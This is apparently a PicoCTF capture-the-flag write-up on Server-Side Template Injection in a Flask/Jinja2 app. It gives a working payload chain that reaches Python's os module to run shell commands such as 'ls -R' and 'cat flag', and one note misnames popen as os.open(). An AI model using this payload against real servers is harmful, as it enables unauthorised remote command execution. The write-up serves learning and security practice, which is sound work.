# SSTI Exploit - PicoCTF Challenge Writeup

This was a Server-Side Template Injection (SSTI) challenge on PicoCTF. At first, I noticed there was a text input on the page, and suspected it might be vulnerable to SSTI. To confirm this, I tried the classic payload:

```jinja2
{{7*7}}
```
*note*: (Jinja2 template syntax) -> {{ ... }} is template code execution, anything inside {{ }} is evaluated on the server.

It returned `49`, which confirmed that the input was being rendered by a template engine and was evaluating expressions. Most likely Jinja2.

---

### Step-by-Step Exploitation

After confirming the SSTI vulnerability, I wanted to explore ways to get a shell command executed. I found an example payload that used Flask internals to break out of the template context and run OS commands.

Here's what I used:

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

*note*: `request.application.__globals__`, this is a trick to reach Python's internal global namespace, its basically a Flask object that gets us the application object and gives us access to the global varisbles.
`__builtins__.__import__('os')`, gives us access to Python’s built-in functions, dynamically imports the os module.

This listed the files on the server.

So I followed it up with:

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
*note*: `os.popen('cat flag').read()`, here we are running a shell command `cat flag` using `os.open()` and reading outputting the flag.

And this successfully output the flag.

---

### To break it down:

* `request.application.__globals__`: Gives access to the global namespace in the Flask application.
* `__builtins__.__import__('os')`: Dynamically imports the `os` module using Python internals.
* `.popen('cat flag').read()`: Executes a shell command and returns the output.

This payload chains all of that together to execute a command on the server via template injection.

---

### What I Learned

This was a really cool example of how SSTI can lead to full command execution if not properly sandboxed. It also showed how deeply you can go into Python internals using the right object chains. It was a good learning experience in both Flask internals and exploiting Jinja2-based SSTI vulnerabilities.